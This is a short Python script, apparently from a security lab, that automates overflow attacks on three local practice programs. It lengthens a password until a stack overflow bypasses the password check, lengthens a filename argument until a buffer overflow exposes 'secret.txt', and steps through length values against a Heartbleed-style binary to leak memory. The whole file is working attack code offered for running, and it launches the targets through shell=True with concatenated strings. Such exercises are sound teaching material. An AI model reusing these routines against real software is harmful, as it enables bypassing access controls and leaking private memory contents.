#!/usr/bin/python
from subprocess import *

def stack_overflow():

    stdout = []
    hack_password = "1"
    counter = 0

    while ("Now entering" not in stdout):
        print("Trying password {} with {} characters".format(hack_password, len(hack_password)))
        proc = Popen(["./stack_overflow"], shell = True,stdin=PIPE,stdout=PIPE,stderr=PIPE)
        proc.stdin.write(hack_password + '\n')
        hack_password += "1"

        proc.stdin.flush()
        stdout,stderr = proc.communicate()
        print(stdout)
        print(stderr)
        counter += 1

    print("\n Code hacked at {} characters".format(counter))
    return counter


def buffer_overflow():

    stdout = []
    filename = "h.txt"
    name = "wsecret.txt"
    counter = 1
    while ("You should not be able to read" not in str(stdout)):

        proc = Popen(["./buffer_overflow " + filename + " " + name], shell = True,stdin=PIPE,stdout=PIPE,stderr=PIPE)
        name = "w" + name
        stdout,stderr = proc.communicate()
        print(stdout)
        print(stderr)
        counter += 1


    print("\n Code hacked at {} characters".format(counter))
    return stdout,counter

def heart_bleed(test_mode = False):
    stdout = []

    counter = 1

    for i in range(75):
        proc = Popen(["./heartbleed " + str(counter)], shell = True,stdin=PIPE,stdout=PIPE,stderr=PIPE)
        stdout,stderr = proc.communicate()
        print(stdout)
        print(stderr)

        counter += 1
    if not test_mode:
        print("what the fuck is test_mode? ", test_mode)
        print("Final message is {}".format(stdout.replace("\n", "")))
    return stdout

if __name__ == "__main__":
    print("uncomment one of below to run a hack")
    #stack_overflow()
    #buffer_overflow()
    #heart_bleed()
